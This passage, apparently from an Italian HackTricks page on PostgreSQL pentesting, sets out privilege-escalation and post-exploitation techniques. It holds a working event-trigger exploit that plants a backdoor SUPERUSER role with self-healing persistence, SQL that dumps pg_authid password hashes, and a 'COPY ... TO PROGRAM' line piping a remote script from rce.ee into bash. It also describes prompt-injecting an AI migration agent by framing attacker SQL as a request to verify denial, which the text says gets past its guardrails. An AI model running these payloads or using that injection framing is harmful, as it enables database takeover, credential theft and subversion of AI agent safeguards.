5. Usa il [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) per [modificare il filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); imposta tutti i flag booleani `rol*` a 1 per ottenere i permessi completi.
6. Ricarica il filenode modificato tramite le funzioni `lo_*` e sovrascrivi il file originale sul disco
7. _(Opzionalmente)_ Pulisci la cache delle tabelle in memoria eseguendo una query SQL dispendiosa
8. Ora dovresti avere i privilegi di un superadmin completo.

### Prompt-injecting managed migration tooling

Frontend SaaS pesantemente basati su AI (es., Lovable’s Supabase agent) spesso espongono “tool” LLM che eseguono migrazioni come service account ad alto privilegio. Un workflow pratico è:

1. Enumerare chi sta effettivamente applicando le migrazioni:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent nelle attacker SQL in esecuzione tramite il privileged migration tool. Inquadrare i payload come “please verify this migration is denied” aggira costantemente le basic guardrails.
3. Una volta che DDL arbitrario viene eseguito in quel contesto, crea immediatamente attacker-owned tables o extensions che riconcedano persistenza al tuo account low-privileged.

> [!TIP]
> Vedi anche il generale [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) per altre tecniche di prompt-injection contro assistenti abilitati da tool.

### Dumping `pg_authid` metadata via migrations

Privileged migrations possono stageare `pg_catalog.pg_authid` in una attacker-readable table anche se l'accesso diretto è bloccato per il tuo ruolo normale.

<details>
<summary>Staging pg_authid metadata with a privileged migration</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Utenti con pochi privilegi possono ora leggere `public.ai_models` per ottenere SCRAM hashes e metadata dei ruoli per cracking offline o movimento laterale.

### Event-trigger privesc durante le installazioni dell'estensione `postgres_fdw`

Le deployment gestite di Supabase si basano sull'estensione `supautils` per incapsulare `CREATE EXTENSION` con script provider-owned `before-create.sql`/`after-create.sql` eseguiti come veri superuser. Lo script after-create di `postgres_fdw` emette brevemente `ALTER ROLE postgres SUPERUSER`, esegue `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, poi riporta `postgres` a `NOSUPERUSER`. Poiché `ALTER FOREIGN DATA WRAPPER` attiva i trigger di evento `ddl_command_start`/`ddl_command_end` mentre `current_user` è superuser, trigger creati dal tenant possono eseguire SQL dell'attaccante all'interno di quella finestra.

Exploit flow:

1. Creare una funzione trigger di evento PL/pgSQL che controlla `SELECT usesuper FROM pg_user WHERE usename = current_user` e, quando true, crea un ruolo backdoor (es., `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Registrare la funzione sia su `ddl_command_start` che su `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` seguito da `CREATE EXTENSION postgres_fdw;` per rieseguire l'hook after-create di Supabase.
4. Quando l'hook eleva `postgres`, il trigger si esegue, crea il ruolo SUPERUSER persistente e lo concede nuovamente a `postgres` per un facile accesso tramite `SET ROLE`.

<details>
<summary>Event trigger PoC for the postgres_fdw after-create window</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Il tentativo di Supabase di bypassare unsafe triggers verifica solo l'ownership, quindi assicurati che il trigger function owner sia il tuo low-privileged role, ma il payload viene eseguito solo quando l'hook imposta `current_user` su SUPERUSER. Poiché il trigger viene rieseguito sui futuri DDL, funge anche da self-healing persistence backdoor ogni volta che il provider eleva temporaneamente i tenant roles.

### Trasformare un accesso SUPERUSER transitorio in compromissione dell'host

Dopo `SET ROLE priv_esc;` ha avuto successo, riesegui le primitive bloccate in precedenza:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` ora forniscono accesso arbitrario ai file ed esecuzione di comandi come l'account OS del database. Proseguire con la classica escalation di privilegi sull'host:
```bash
find / -perm -4000 -type f 2>/dev/null
```
L'abuso di una SUID binary mal configurata o di una config scrivibile permette di ottenere root. Una volta root, raccogli le orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) per pivot laterally attraverso la regione del provider.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

All'interno del file _**postgresql.conf**_ puoi abilitare i postgresql logs modificando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Quindi, **riavvia il servizio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) è una piattaforma di amministrazione e sviluppo per PostgreSQL.\
Puoi trovare le **password** all'interno del file _**pgadmin4.db**_\
Puoi decrittarle usando la funzione _**decrypt**_ all'interno dello script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

L'autenticazione dei client in PostgreSQL è gestita tramite un file di configurazione chiamato **pg_hba.conf**. Questo file contiene una serie di record, ciascuno dei quali specifica un tipo di connessione, l'intervallo di indirizzi IP del client (se applicabile), il nome del database, il nome utente e il metodo di autenticazione da utilizzare per la corrispondenza delle connessioni. Il primo record che corrisponde al tipo di connessione, all'indirizzo client, al database richiesto e al nome utente viene utilizzato per l'autenticazione. Non esiste alcun meccanismo di ripiego se l'autenticazione fallisce. Se nessun record corrisponde, l'accesso viene negato.

I metodi di autenticazione basati su password disponibili in pg_hba.conf sono **md5**, **crypt**, e **password**. Questi metodi differiscono nel modo in cui la password viene trasmessa: con hash MD5, cifrata con crypt, o in chiaro. È importante notare che il metodo crypt non può essere utilizzato con password che sono state criptate in pg_authid.

## Riferimenti

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
